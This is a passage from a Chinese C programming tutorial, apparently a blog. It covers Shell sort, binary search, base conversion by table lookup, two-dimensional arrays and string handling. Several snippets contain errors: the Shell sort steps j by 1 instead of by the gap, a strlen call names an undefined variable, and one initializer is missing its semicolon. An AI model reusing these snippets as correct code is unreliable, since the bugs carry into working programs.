            <span class="hljs-keyword">if</span>(nums[j<span class="hljs-number">-1</span>] &gt; nums[j])&#123;
                <span class="hljs-type">int</span> temp = nums[j];
                nums[j] = nums[j - <span class="hljs-number">1</span>];
                nums[j - <span class="hljs-number">1</span>] = temp;
            &#125;<span class="hljs-keyword">else</span>&#123;
                <span class="hljs-keyword">break</span>;
            &#125;
        &#125;
    &#125;
&#125;</code></pre>
<h2 id="希尔排序">希尔排序</h2>
<ul>
<li>
<p>1959年Shell发明，第一个突破O(n2)的排序算法，是简单插入排序的改进版。它与插入排序的不同之处在于，它会优先比较距离较远的元素。希尔排序又叫缩小增量排序。<br>
[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-Umu8w50P-1648814825894)(<a href="https://gitee.com/hzy2003628/drawing-bed/raw/master/images/20220313182846.gif">https://gitee.com/hzy2003628/drawing-bed/raw/master/images/20220313182846.gif</a>)]</p>
</li>
<li>
<p>排序思路:</p>
<ul>
<li>1.希尔排序可以理解为插入排序的升级版, 先将待排序数组按照指定步长划分为几个小数组</li>
<li>2.利用插入排序对小数组进行排序, 然后将几个排序的小数组重新合并为原始数组</li>
<li>3.重复上述操作, 直到步长为1时,再利用插入排序排序即可</li>
</ul>
</li>
<li>
<p>代码实现:</p>
<pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>
&#123;
    <span class="hljs-comment">// 待排序数组</span>
    <span class="hljs-type">int</span> nums[<span class="hljs-number">5</span>] = &#123;<span class="hljs-number">3</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>, <span class="hljs-number">3</span>&#125;;
    <span class="hljs-comment">// 0.计算待排序数组长度</span>
    <span class="hljs-type">int</span> len = <span class="hljs-keyword">sizeof</span>(nums) / <span class="hljs-keyword">sizeof</span>(nums[<span class="hljs-number">0</span>]);

<span class="hljs-comment">// 2.计算步长</span>
    <span class="hljs-type">int</span> gap = len / <span class="hljs-number">2</span>;
    <span class="hljs-keyword">do</span>&#123;
        <span class="hljs-comment">//  1.从第一个元素开始依次取出所有用于比较元素</span>
        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = gap; i &lt; len; i++)
        &#123;
            <span class="hljs-comment">// 2.遍历取出前面元素进行比较</span>
            <span class="hljs-type">int</span> j = i;
            <span class="hljs-keyword">while</span>((j - gap) &gt;= <span class="hljs-number">0</span>)
            &#123;
                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%i &gt; %i\n&quot;</span>, nums[j - gap], nums[j]);
                <span class="hljs-comment">// 3.如果前面一个元素大于当前元素,就交换位置</span>
                <span class="hljs-keyword">if</span>(nums[j - gap] &gt; nums[j])&#123;
                    <span class="hljs-type">int</span> temp = nums[j];
                    nums[j] = nums[j - gap];
                    nums[j - gap] = temp;
                &#125;<span class="hljs-keyword">else</span>&#123;
                    <span class="hljs-keyword">break</span>;
                &#125;
                j--;
            &#125;
        &#125;
        <span class="hljs-comment">// 每个小数组排序完成, 重新计算步长</span>
        gap = gap / <span class="hljs-number">2</span>;
    &#125;<span class="hljs-keyword">while</span>(gap &gt;= <span class="hljs-number">1</span>);
&#125;</code></pre>
<h2 id="折半查找">折半查找</h2>
<ul>
<li><strong>基本思路</strong></li>
<li>在有序表中,取中间元素作为比较对象,若给定值与中间元素的要查找的数相等,则查找成功;若给定值小于中间元素的要查找的数,则在中间元素的左半区继续查找;</li>
<li>若给定值大于中间元素的要查找的数,则在中间元素的右半区继续查找。不断重复上述查找过 程,直到查找成功,或所查找的区域无数据元素,查找失败</li>
</ul>
<hr>
<ul>
<li><strong>实现步骤</strong></li>
<li>在有序表中,取中间元素作为比较对象,若给定值与中间元素的要查找的数相等,则查找成功;</li>
<li>若给定值小于中间元素的要查找的数,则在中间元素的左半区继续查找;</li>
<li>若给定值大于中间元素的要查找的数,则在中间元素的右半区继续查找。</li>
<li>不断重复上述查找过 程,直到查找成功,或所查找的区域无数据元素,查找失败。<br>
<img src="https://img-blog.csdnimg.cn/img_convert/0bad829a2c91e8aae03c4fdf31b70272.png" alt="img"></li>
</ul>
</li>
<li>
<p><strong>代码实现</strong></p>
</li>
</ul>
<pre><code class="hljs plaintext">int findKey(int values[], int length, int key) &#123;
    // 定义一个变量记录最小索引
    int min = 0;
    // 定义一个变量记录最大索引
    int max = length - 1;
    // 定义一个变量记录中间索引
    int mid = (min + max) * 0.5;
    
    while (min &lt;= max) &#123;
        // 如果mid对应的值 大于 key, 那么max要变小
        if (values[mid] &gt; key) &#123;
            max = mid - 1;
            // 如果mid对应的值 小于 key, 那么min要变
        &#125;else if (values[mid] &lt; key) &#123;
            min = mid + 1;
        &#125;else &#123;
            return mid;
        &#125;
        // 修改完min/max之后, 重新计算mid的值
        mid = (min + max) * 0.5;
    &#125;
    return -1;
&#125;</code></pre>
<h2 id="进制转换查表法">进制转换(查表法)</h2>
<ul>
<li>实现思路:
<ul>
<li>将二进制、八进制、十进制、十六进制所有可能的字符都存入数组</li>
<li>利用按位与运算符和右移依次取出当前进制对应位置的值</li>
<li>利用取出的值到数组中查询当前位输出的结果</li>
<li>将查询的结果存入一个新的数组, 当所有位都查询存储完毕, 新数组中的值就是对应进制的值</li>
</ul>
</li>
<li>代码实现</li>
</ul>
<pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>
<span class="hljs-type">void</span> <span class="hljs-title function_">toBinary</span><span class="hljs-params">(<span class="hljs-type">int</span> num)</span>
&#123;
    total(num, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>);
&#125;
<span class="hljs-type">void</span> <span class="hljs-title function_">toOct</span><span class="hljs-params">(<span class="hljs-type">int</span> num)</span>
&#123;
    total(num, <span class="hljs-number">7</span>, <span class="hljs-number">3</span>);
&#125;
<span class="hljs-type">void</span> <span class="hljs-title function_">toHex</span><span class="hljs-params">(<span class="hljs-type">int</span> num)</span>
&#123;
    total(num, <span class="hljs-number">15</span>, <span class="hljs-number">4</span>);
&#125;

<span class="hljs-type">void</span> <span class="hljs-title function_">total</span><span class="hljs-params">(<span class="hljs-type">int</span> num , <span class="hljs-type">int</span> base, <span class="hljs-type">int</span> offset)</span>
&#123;
    <span class="hljs-comment">//    1.定义表用于查询结果</span>
    <span class="hljs-type">char</span> cs[] = &#123;
        <span class="hljs-string">&#x27;0&#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>, <span class="hljs-string">&#x27;2&#x27;</span>, <span class="hljs-string">&#x27;3&#x27;</span>, <span class="hljs-string">&#x27;4&#x27;</span>, <span class="hljs-string">&#x27;5&#x27;</span>,
        <span class="hljs-string">&#x27;6&#x27;</span>, <span class="hljs-string">&#x27;7&#x27;</span>, <span class="hljs-string">&#x27;8&#x27;</span>, <span class="hljs-string">&#x27;9&#x27;</span>, <span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-string">&#x27;b&#x27;</span>,
        <span class="hljs-string">&#x27;c&#x27;</span>, <span class="hljs-string">&#x27;d&#x27;</span>, <span class="hljs-string">&#x27;e&#x27;</span>, <span class="hljs-string">&#x27;f&#x27;</span>
    &#125;;
    <span class="hljs-comment">//    2.定义保存结果的数组</span>
    <span class="hljs-type">char</span> rs[<span class="hljs-number">32</span>];
    <span class="hljs-comment">//    计算最大的角标位置</span>
    <span class="hljs-type">int</span> length = <span class="hljs-keyword">sizeof</span>(rs)/<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">char</span>);
    <span class="hljs-type">int</span> pos = length;<span class="hljs-comment">//8</span>

    <span class="hljs-keyword">while</span> (num != <span class="hljs-number">0</span>) &#123;
        <span class="hljs-type">int</span> index = num &amp; base;
        rs[--pos] = cs[index];
        num = num &gt;&gt; offset;
    &#125;

    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = pos; i &lt; length; i++) &#123;
        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>, rs[i]);
    &#125;
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);
&#125;
<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>
&#123;
    toBinary(<span class="hljs-number">9</span>);
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
&#125;</code></pre>
<h2 id="二维数组">二维数组</h2>
<ul>
<li>所谓二维数组就是一个一维数组的每个元素又被声明为一 维数组,从而构成二维数组. 可以说二维数组是特殊的一维数组。</li>
<li>示例:
<ul>
<li>int a[2][3] = { {80,75,92}, {61,65,71}};</li>
<li>可以看作由一维数组a[0]和一维数组a[1]组成，这两个一维数组都包含了3个int类型的元素<br>
<img src="https://img-blog.csdnimg.cn/img_convert/b8e0dae7399f15ebfa04bbe17e3b9c2f.png" alt="img"></li>
</ul>
</li>
</ul>
<h2 id="二维数组的定义">二维数组的定义</h2>
<ul>
<li>格式:
<ul>
<li>数据类型 数组名[一维数组的个数][一维数组的元素个数]</li>
<li>其中&quot;一维数组的个数&quot;表示当前二维数组中包含多少个一维数组</li>
<li>其中&quot;一维数组的元素个数&quot;表示当前前二维数组中每个一维数组元素的个数</li>
</ul>
</li>
</ul>
<hr>
<h2 id="二维数组的初始化">二维数组的初始化</h2>
<ul>
<li>二维数的初始化可分为两种:
<ul>
<li>定义的同时初始化</li>
<li>先定义后初始化</li>
</ul>
</li>
<li>定义的同时初始化</li>
</ul>
<pre><code class="hljs c"><span class="hljs-type">int</span> a[<span class="hljs-number">2</span>][<span class="hljs-number">3</span>]=&#123; &#123;<span class="hljs-number">80</span>,<span class="hljs-number">75</span>,<span class="hljs-number">92</span>&#125;, &#123;<span class="hljs-number">61</span>,<span class="hljs-number">65</span>,<span class="hljs-number">71</span>&#125;&#125;;</code></pre>
<ul>
<li>先定义后初始化</li>
</ul>
<pre><code class="hljs c"><span class="hljs-type">int</span> a[<span class="hljs-number">2</span>][<span class="hljs-number">3</span>];
a[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>] = <span class="hljs-number">80</span>;
a[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>] = <span class="hljs-number">75</span>;
a[<span class="hljs-number">0</span>][<span class="hljs-number">2</span>] = <span class="hljs-number">92</span>;
a[<span class="hljs-number">1</span>][<span class="hljs-number">0</span>] = <span class="hljs-number">61</span>;
a[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>] = <span class="hljs-number">65</span>;
a[<span class="hljs-number">1</span>][<span class="hljs-number">2</span>] = <span class="hljs-number">71</span>;</code></pre>
<ul>
<li>按行分段赋值</li>
</ul>
<pre><code class="hljs c"><span class="hljs-type">int</span> a[<span class="hljs-number">2</span>][<span class="hljs-number">3</span>]=&#123; &#123;<span class="hljs-number">80</span>,<span class="hljs-number">75</span>,<span class="hljs-number">92</span>&#125;, &#123;<span class="hljs-number">61</span>,<span class="hljs-number">65</span>,<span class="hljs-number">71</span>&#125;&#125;;</code></pre>
<ul>
<li>按行连续赋值</li>
</ul>
<pre><code class="hljs c"><span class="hljs-type">int</span> a[<span class="hljs-number">2</span>][<span class="hljs-number">3</span>]=&#123; <span class="hljs-number">80</span>,<span class="hljs-number">75</span>,<span class="hljs-number">92</span>,<span class="hljs-number">61</span>,<span class="hljs-number">65</span>,<span class="hljs-number">71</span>&#125;;</code></pre>
<ul>
<li>其它写法
<ul>
<li>完全初始化,可以省略第一维的长度</li>
</ul>
</li>
</ul>
<pre><code class="hljs c"><span class="hljs-type">int</span> a[][<span class="hljs-number">3</span>]=&#123;&#123;<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>&#125;,&#123;<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>&#125;&#125;;
<span class="hljs-type">int</span> a[][<span class="hljs-number">3</span>]=&#123;<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>&#125;;</code></pre>
<ul>
<li>部分初始化,可以省略第一维的长度</li>
</ul>
<pre><code class="hljs c"><span class="hljs-type">int</span> a[][<span class="hljs-number">3</span>]=&#123;&#123;<span class="hljs-number">1</span>&#125;,&#123;<span class="hljs-number">4</span>,<span class="hljs-number">5</span>&#125;&#125;;
<span class="hljs-type">int</span> a[][<span class="hljs-number">3</span>]=&#123;<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>&#125;;</code></pre>
<blockquote>
<ul>
<li>注意: 有些人可能想不明白，为什么可以省略行数，但不可以省略列数。也有人可能会问，可不可以只指定行数，但是省略列数？其实这个问题很简单，如果我们这样写：<br>
int a[2][] = {1, 2, 3, 4, 5, 6}; // 错误写法<br>
大家都知道，二维数组会先存放第1行的元素，由于不确定列数，也就是不确定第1行要存放多少个元素，所以这里会产生很多种情况，可能1、2是属于第1行的，也可能1、2、3、4是第一行的，甚至1、2、3、4、5、6全部都是属于第1行的</li>
</ul>
</blockquote>
<ul>
<li>指定元素的初始化</li>
</ul>
<pre><code class="hljs c"><span class="hljs-type">int</span> a[<span class="hljs-number">2</span>][<span class="hljs-number">3</span>]=&#123;[<span class="hljs-number">1</span>][<span class="hljs-number">2</span>]=<span class="hljs-number">10</span>&#125;;
<span class="hljs-type">int</span> a[<span class="hljs-number">2</span>][<span class="hljs-number">3</span>]=&#123;[<span class="hljs-number">1</span>]=&#123;<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>&#125;&#125;</code></pre>
<h2 id="二维数组的应用场景">二维数组的应用场景</h2>
<p><img src="https://img-blog.csdnimg.cn/img_convert/43fe0dd435bab8e2e6e15607292bb8db.png" alt="img"><br>
<img src="https://img-blog.csdnimg.cn/img_convert/2b528f4a19c3216fe9b065d9fade0e87.png" alt="img"><br>
<img src="https://img-blog.csdnimg.cn/img_convert/3f2dba4bc54f5d87aa70b7563ec9a033.png" alt="img"></p>
<h2 id="二维数组的遍历和存储">二维数组的遍历和存储</h2>
<h2 id="二维数组的遍历">二维数组的遍历</h2>
<ul>
<li>二维数组a[3][4],可分解为三个一维数组,其数组名分别为:
<ul>
<li>这三个一维数组都有4个元素,例如:一维数组a[0]的 元素为a[0][0],a[0][1],a[0][2],a[0][3]。</li>
<li>所以遍历二维数组无非就是先取出二维数组中得一维数组, 然后再从一维数组中取出每个元素的值</li>
</ul>
</li>
<li>示例</li>
</ul>
<pre><code class="hljs c"><span class="hljs-type">char</span> cs[<span class="hljs-number">2</span>][<span class="hljs-number">3</span>] = &#123;
    &#123;<span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-string">&#x27;b&#x27;</span>, <span class="hljs-string">&#x27;c&#x27;</span>&#125;,
    &#123;<span class="hljs-string">&#x27;d&#x27;</span>, <span class="hljs-string">&#x27;e&#x27;</span>, <span class="hljs-string">&#x27;f&#x27;</span>&#125;
&#125;;
<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>, cs[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>]);<span class="hljs-comment">// 第一个[0]取出一维数组, 第二个[0]取出一维数组中对应的元素</span></code></pre>
<pre><code class="hljs c"><span class="hljs-type">char</span> cs[<span class="hljs-number">2</span>][<span class="hljs-number">3</span>] = &#123;
    &#123;<span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-string">&#x27;b&#x27;</span>, <span class="hljs-string">&#x27;c&#x27;</span>&#125;,
    &#123;<span class="hljs-string">&#x27;d&#x27;</span>, <span class="hljs-string">&#x27;e&#x27;</span>, <span class="hljs-string">&#x27;f&#x27;</span>&#125;
&#125;;
<span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">2</span>; i++) &#123; <span class="hljs-comment">// 外循环取出一维数组</span>
    <span class="hljs-comment">// i</span>
    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">3</span>; j++) &#123;<span class="hljs-comment">// 内循环取出一维数组的每个元素</span>
        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>, cs[i][j]);
    &#125;
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);
&#125;</code></pre>
<blockquote>
<p>注意: 必须强调的是,a[0],a[1],a[2]不能当作下标变量使用,它们是数组名,不是一个单纯的下标变量</p>
</blockquote>
<h2 id="二维数组的存储">二维数组的存储</h2>
<ul>
<li>和以为数组一样
<ul>
<li>给数组分配存储空间从内存地址大开始分配</li>
<li>给数组元素分配空间, 从所占用内存地址小的开始分配</li>
<li>往每个元素中存储数据从高地址开始存储</li>
</ul>
</li>
</ul>
<pre><code class="hljs plaintext">#include &lt;stdio.h&gt;
int main()
&#123;
    char cs[2][3] = &#123;
        &#123;&#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;&#125;,
        &#123;&#x27;d&#x27;, &#x27;e&#x27;, &#x27;f&#x27;&#125;
    &#125;;
    // cs == &amp;cs == &amp;cs[0] == &amp;cs[0][0]
    printf(&quot;cs = %p\n&quot;, cs);                // 0060FEAA
    printf(&quot;&amp;cs = %p\n&quot;, &amp;cs);              // 0060FEAA
    printf(&quot;&amp;cs[0] = %p\n&quot;, &amp;cs[0]);        // 0060FEAA
    printf(&quot;&amp;cs[0][0] = %p\n&quot;, &amp;cs[0][0]);  // 0060FEAA
    return 0;
&#125;</code></pre>
<p><img src="https://img-blog.csdnimg.cn/img_convert/99cb51fe68942cd57169c30b9ea1af51.png" alt="img"></p>
<h2 id="二维数组与函数">二维数组与函数</h2>
<ul>
<li>值传递</li>
</ul>
<pre><code class="hljs plaintext">#include &lt;stdio.h&gt;

// 和一位数组一样, 只看形参是基本类型还是数组类型
// 如果是基本类型在函数中修改形参不会影响实参
void change(char ch)&#123;
    ch = &#x27;n&#x27;;
&#125;
int main()
&#123;
    char cs[2][3] = &#123;
        &#123;&#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;&#125;,
        &#123;&#x27;d&#x27;, &#x27;e&#x27;, &#x27;f&#x27;&#125;
    &#125;;
    printf(&quot;cs[0][0] = %c\n&quot;, cs[0][0]); // a
    change(cs[0][0]);
    printf(&quot;cs[0][0] = %c\n&quot;, cs[0][0]); // a
    return 0;
&#125;</code></pre>
<ul>
<li>地址传递</li>
</ul>
<pre><code class="hljs plaintext">#include &lt;stdio.h&gt;

// 和一位数组一样, 只看形参是基本类型还是数组类型
// 如果是数组类型在函数中修改形参会影响实参
void change(char ch[])&#123;
    ch[0] = &#x27;n&#x27;;
&#125;
int main()
&#123;
    char cs[2][3] = &#123;
        &#123;&#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;&#125;,
        &#123;&#x27;d&#x27;, &#x27;e&#x27;, &#x27;f&#x27;&#125;
    &#125;;
    printf(&quot;cs[0][0] = %c\n&quot;, cs[0][0]); // a
    change(cs[0]);
    printf(&quot;cs[0][0] = %c\n&quot;, cs[0][0]); // n
    return 0;
&#125;</code></pre>
<pre><code class="hljs plaintext">#include &lt;stdio.h&gt;

// 和一位数组一样, 只看形参是基本类型还是数组类型
// 如果是数组类型在函数中修改形参会影响实参
void change(char ch[][3])&#123;
    ch[0][0] = &#x27;n&#x27;;
&#125;
int main()
&#123;
    char cs[2][3] = &#123;
        &#123;&#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;&#125;,
        &#123;&#x27;d&#x27;, &#x27;e&#x27;, &#x27;f&#x27;&#125;
    &#125;;
    printf(&quot;cs[0][0] = %c\n&quot;, cs[0][0]); // a
    change(cs);
    printf(&quot;cs[0][0] = %c\n&quot;, cs[0][0]); // n
    return 0;
&#125;</code></pre>
<h2 id="二维数组作为函数参数注意点">二维数组作为函数参数注意点</h2>
<ul>
<li>形参错误写法</li>
</ul>
<pre><code class="hljs plaintext">void test(char cs[2][]) // 错误写法
&#123;
    printf(&quot;我被执行了\n&quot;);
&#125;

void test(char cs[2][3]) // 正确写法
&#123;
    printf(&quot;我被执行了\n&quot;);
&#125;

void test(char cs[][3]) // 正确写法
&#123;
    printf(&quot;我被执行了\n&quot;);
&#125;</code></pre>
<ul>
<li>二维数组作为函数参数，在被调函数中不能获得其有多少行，需要通过参数传入</li>
</ul>
<pre><code class="hljs plaintext">void test(char cs[2][3])
&#123;
    int row = sizeof(cs); // 输出4或8
    printf(&quot;row = %zu\n&quot;, row);
&#125;</code></pre>
<ul>
<li>二维数组作为函数参数，在被调函数中可以计算出二维数组有多少列</li>
</ul>
<pre><code class="hljs plaintext">void test(char cs[2][3])
&#123;
    size_t col = sizeof(cs[0]); // 输出3
    printf(&quot;col = %zd\n&quot;, col);
&#125;</code></pre>
<h2 id="作业">作业</h2>
<ul>
<li>玩家通过键盘录入 w,s,a,d控制小人向不同方向移动,其中w代表向上移动,s代表向 下移动,a代表向左移动,d 代表向右移动,当小人移动到出口位置,玩家胜利</li>
<li>思路:</li>
<li>1.定义二维数组存放地图</li>
</ul>
<pre><code class="hljs plaintext">######
#O #
# ## #
#  # #
##   #
######</code></pre>
<p>2.规定地图的方向<br>
<img src="https://img-blog.csdnimg.cn/img_convert/521837e15acbd1237f4fcab0bb174c39.png" alt="img"></p>
<ul>
<li>3.编写程序控制方向
<ul>
<li>当输入w或者W, 小人向上移动. x-1</li>
<li>当输入s 或者S, 小人向下. x+1</li>
<li>当输入a或者A, 小人向左. y-1</li>
<li>当输入d或者D, 小人向右. y+1</li>
</ul>
</li>
<li>4.移动小人
<ul>
<li>用变量记录小人当前的位置
<ul>
<li>1)如果小人将要移动的位置是墙,则无法移动</li>
<li>2)如果小人将要移动的位置是路,则可以移动</li>
</ul>
</li>
</ul>
</li>
<li>5.判断是否走出迷宫</li>
</ul>
<h2 id="字符串的基本概念">字符串的基本概念</h2>
<ul>
<li>字符串是位于双引号中的字符序列
<ul>
<li>在内存中以“\0”结束,所占字节比实际多一个<br>
<img src="https://img-blog.csdnimg.cn/img_convert/6651cb18fef094c201f9c7a0cfe1dbd0.png" alt="img"></li>
</ul>
</li>
</ul>
<h2 id="字符串的初始化">字符串的初始化</h2>
<ul>
<li>在C语言中没有专门的字符串变量,通常用一个字符数组来存放一个字符串。
<ul>
<li>当把一个字符串存入一个数组时,会把结束符‘\0’存入数组,并以此作为该字符串是否结束的标志。</li>
<li>有了‘\0’标志后,就不必再用字符数组 的长度来判断字符串的长度了</li>
</ul>
</li>
<li>初始化</li>
</ul>
<pre><code class="hljs plaintext">char name[9] = &quot;lnj&quot;; //在内存中以“\0”结束， \0ASCII码值是0
char name1[9] = &#123;&#x27;l&#x27;,&#x27;n&#x27;,&#x27;j&#x27;,&#x27;\0&#x27;&#125;;
char name2[9] = &#123;&#x27;l&#x27;,&#x27;n&#x27;,&#x27;j&#x27;,0&#125;;
// 当数组元素个数大于存储字符内容时, 未被初始化的部分默认值是0, 所以下面也可以看做是一个字符串
char name3[9] = &#123;&#x27;l&#x27;,&#x27;n&#x27;,&#x27;j&#x27;&#125;;</code></pre>
<ul>
<li>错误的初始化方式</li>
</ul>
<pre><code class="hljs plaintext">    //省略元素个数时, 不能省略末尾的\n
    // 不正确地写法，结尾没有\0 ，只是普通的字符数组
    char name4[] = &#123;&#x27;l&#x27;,&#x27;n&#x27;,&#x27;j&#x27;&#125;;

     //   &quot;中间不能包含\0&quot;, 因为\0是字符串的结束标志
     //    \0的作用：字符串结束的标志
    char name[] = &quot;c\0ool&quot;;
     printf(&quot;name = %s\n&quot;,name);
输出结果: c</code></pre>
<h2 id="字符串输出">字符串输出</h2>
<ul>
<li>如果字符数组中存储的是一个字符串, 那么字符数组的输入输出将变得简单方便。
<ul>
<li>不必使用循环语句逐个地输入输出每个字符</li>
<li>可以使用printf函数和scanf函数一次性输出输入一个字符数组中的字符串</li>
</ul>
</li>
<li>使用的格式字符串为“%s”,表示输入、输出的是一个字符串 字符串的输出</li>
</ul>
<hr>
<ul>
<li>输出
<ul>
<li>%s的本质就是根据传入的name的地址逐个去取数组中的元素然后输出，直到遇到\0位置</li>
</ul>
</li>
</ul>
<pre><code class="hljs plaintext">char chs[] = &quot;lnj&quot;;
printf(&quot;%s\n&quot;, chs);</code></pre>
<ul>
<li>注意点:
<ul>
<li>\0引发的脏读问题</li>
</ul>
</li>
</ul>
<pre><code class="hljs plaintext">char name[] = &#123;&#x27;c&#x27;, &#x27;o&#x27;, &#x27;o&#x27;, &#x27;l&#x27; , &#x27;\0&#x27;&#125;;
char name2[] = &#123;&#x27;l&#x27;, &#x27;n&#x27;, &#x27;j&#x27;&#125;;
printf(&quot;name2 = %s\n&quot;, name2); // 输出结果: lnjcool</code></pre>
<ul>
<li><strong>输入</strong></li>
</ul>
<pre><code class="hljs plaintext">char ch[10];
scanf(&quot;%s&quot;,ch);</code></pre>
<ul>
<li>注意点:
<ul>
<li>对一个字符串数组, 如果不做初始化赋值, 必须指定数组长度</li>
<li>ch最多存放由9个字符构成的字符串，其中最后一个字符的位置要留给字符串的结尾标示‘\0’</li>
<li>当用scanf函数输入字符串时,字符串中不能含有空格,否则将以空格作为串的结束符</li>
</ul>
</li>
</ul>
<hr>
<h2 id="字符串常用方法">字符串常用方法</h2>
<ul>
<li>C语言中供了丰富的字符串处理函数,大致可分为字符串的输入、输出、合并、修改、比较、转 换、复制、搜索几类。
<ul>
<li>使用这些函数可大大减轻编程的负担。</li>
<li>使用输入输出的字符串函数,在使用前应包含头文件&quot;stdio.h&quot;</li>
<li>使用其它字符串函数则应包含头文件&quot;string.h&quot;</li>
</ul>
</li>
</ul>
<hr>
<ul>
<li>字符串输出函数:puts
<ul>
<li>格式: puts(字符数组名)</li>
<li>功能:把字符数组中的字符串输出到显示器。即在屏幕上显示该字符串。</li>
</ul>
</li>
<li>优点:
<ul>
<li>自动换行</li>
<li>可以是数组的任意元素地址</li>
</ul>
</li>
<li>缺点
<ul>
<li>不能自定义输出格式, 例如 puts(“hello %i”);</li>
</ul>
</li>
</ul>
<pre><code class="hljs c"><span class="hljs-type">char</span> ch[] = <span class="hljs-string">&quot;lnj&quot;</span>;
<span class="hljs-built_in">puts</span>(ch); <span class="hljs-comment">//输出结果: lnj</span></code></pre>
<blockquote>
<ul>
<li>puts函数完全可以由printf函数取代。当需要按一定格式输出时,通常使用printf函数</li>
</ul>
</blockquote>
<ul>
<li>字符串输入函数:gets
<ul>
<li>格式: gets (字符数组名)</li>
<li>功能:从标准输入设备键盘上输入一个字符串。</li>
</ul>
</li>
</ul>
<pre><code class="hljs c"><span class="hljs-type">char</span> ch[<span class="hljs-number">30</span>];
gets(ch); <span class="hljs-comment">// 输入:lnj</span>
<span class="hljs-built_in">puts</span>(ch); <span class="hljs-comment">// 输出:lnj</span></code></pre>
<blockquote>
<ul>
<li>可以看出当输入的字符串中含有空格时,输出仍为全部字符串。说明gets函数并不以空格作为字符串输入结束的标志,而只以回车作为输入结束。这是与scanf函数不同的。</li>
<li>注意gets很容易导致数组下标越界，是一个不安全的字符串操作函数</li>
</ul>
</blockquote>
<ul>
<li>字符串长度</li>
<li>利用sizeof字符串长度
<ul>
<li>因为字符串在内存中是逐个字符存储的,一个字符占用一个字节,所以字符串的结束符长度也是占用的内存单元的字节数。</li>
</ul>
</li>
</ul>
<pre><code class="hljs c"><span class="hljs-type">char</span> name[] = <span class="hljs-string">&quot;it666&quot;</span>;
<span class="hljs-type">int</span> size = <span class="hljs-keyword">sizeof</span>(name);<span class="hljs-comment">// 包含\0</span>
<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;size = %d\n&quot;</span>, size); <span class="hljs-comment">//输出结果:6</span></code></pre>
<ul>
<li>利用系统函数
<ul>
<li>格式: strlen(字符数组名)</li>
<li>功能:测字符串的实际长度(不含字符串结束标志‘\0’)并作为函数返回值。</li>
</ul>
</li>
</ul>
<pre><code class="hljs c"><span class="hljs-type">char</span> name[] = <span class="hljs-string">&quot;it666&quot;</span>;
<span class="hljs-type">size_t</span> len = <span class="hljs-built_in">strlen</span>(name2);
<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;len = %lu\n&quot;</span>, len); <span class="hljs-comment">//输出结果:5</span></code></pre>
<ul>
<li>以“\0”为字符串结束条件进行统计</li>
</ul>
<pre><code class="hljs c"><span class="hljs-comment">/**</span>
<span class="hljs-comment"> *  自定义方法计算字符串的长度</span>
<span class="hljs-comment"> *  @param name 需要计算的字符串</span>
<span class="hljs-comment"> *  @return 不包含\0的长度</span>
<span class="hljs-comment"> */</span>
<span class="hljs-type">int</span> <span class="hljs-title function_">myStrlen2</span><span class="hljs-params">(<span class="hljs-type">char</span> str[])</span>
&#123;
    <span class="hljs-comment">//    1.定义变量保存字符串的长度</span>
    <span class="hljs-type">int</span> length = <span class="hljs-number">0</span>;
    <span class="hljs-keyword">while</span> (str[length] != <span class="hljs-string">&#x27;\0&#x27;</span>)
    &#123;
        length++;<span class="hljs-comment">//1 2 3 4</span>
    &#125;
    <span class="hljs-keyword">return</span> length;
&#125;
<span class="hljs-comment">/**</span>
<span class="hljs-comment"> *  自定义方法计算字符串的长度</span>
<span class="hljs-comment"> *  @param name  需要计算的字符串</span>
<span class="hljs-comment"> *  @param count 字符串的总长度</span>
<span class="hljs-comment"> *  @return 不包含\0的长度</span>
<span class="hljs-comment"> */</span>
<span class="hljs-type">int</span> <span class="hljs-title function_">myStrlen</span><span class="hljs-params">(<span class="hljs-type">char</span> str[], <span class="hljs-type">int</span> count)</span>
&#123;
<span class="hljs-comment">//    1.定义变量保存字符串的长度</span>
    <span class="hljs-type">int</span> length = <span class="hljs-number">0</span>;
